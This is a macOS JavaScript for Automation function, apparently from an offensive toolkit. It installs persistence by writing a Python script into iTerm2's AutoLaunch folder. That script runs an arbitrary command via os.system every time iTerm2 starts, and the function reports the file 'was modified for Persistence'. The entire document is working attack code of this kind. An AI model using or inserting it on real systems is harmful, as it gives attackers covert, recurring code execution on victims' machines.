function iTermAppScript (command) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true;
var userHome = $.getenv('HOME')

var output = ""
try{
	function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
        
	function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
}
    function createFolder(path) { 
	$.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(), $())
        }
	var itermScriptpath = userHome + '/Library/Application\ Support/iTerm2/Scripts/AutoLaunch/iTerm.py'
	var itermPath =  userHome + '/Library/Application\ Support/iTerm2/Scripts/AutoLaunch'
	isDir=Ref()
	var itermExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(itermPath)
                if (itermExistsCheck == false){
					output += "Created AutoLaunch Folder and "
					createFolder(itermPath)
					}
var commandTemplate = `
#!/usr/bin/env python3

import iterm2
import os
async def main(connection):
    async with iterm2.CustomControlSequenceMonitor(connection, "shared-secret", r'^create-window$') as mon:
        while True:
            match = await mon.async_get()
            await iterm2.Window.async_create(connection)
    
os.system(templateCommand)
iterm2.run_forever(main)`

	var newCommand = commandTemplate.replace(/templateCommand/g,'"' + command + '"' )
	writeTextToFile(newCommand, itermScriptpath, false)
	output += "iTerm Application script at  " + itermScriptpath + " was modified for Persistence"					
				
}catch(error){
       output += error.toString()
		}
	return output
}
